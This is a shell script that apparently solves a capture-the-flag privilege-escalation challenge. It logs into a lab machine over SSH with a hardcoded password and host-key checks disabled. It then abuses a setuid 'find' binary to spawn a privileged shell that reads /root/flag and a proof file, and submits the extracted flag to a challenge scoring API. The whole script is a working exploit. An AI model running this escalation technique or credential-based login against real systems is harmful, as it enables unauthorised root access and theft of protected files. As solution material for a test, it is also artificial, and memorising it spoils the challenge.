#!/bin/sh
set -eu

HOST=172.20.0.147
USER=retro
PASSWORD=orbit-terminal-6
CHALLENGE_ID=scl-challenge-frame-5b0109

ROOT_OUTPUT=$(sshpass -p "$PASSWORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o ConnectTimeout=8 \
  "$USER@$HOST" \
  "find /tmp -maxdepth 0 -exec /bin/sh -p -c 'cat /root/flag; cat /root/.escalation-proof' _ {} +")
printf '%s\n' "$ROOT_OUTPUT"

FLAG=$(printf '%s\n' "$ROOT_OUTPUT" | python3 -c 'import re,sys; m=re.search(r"BSY\{[^}]+\}", sys.stdin.read()); print(m.group(0) if m else "")')
[ -n "$FLAG" ] || { printf '%s\n' 'Could not extract the challenge flag.' >&2; exit 1; }

curl -sS http://172.20.0.3/api/challenges/submit \
  -X POST \
  -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"$CHALLENGE_ID\",\"task_id\":\"task1\",\"flag\":\"$FLAG\"}"
printf '\n'
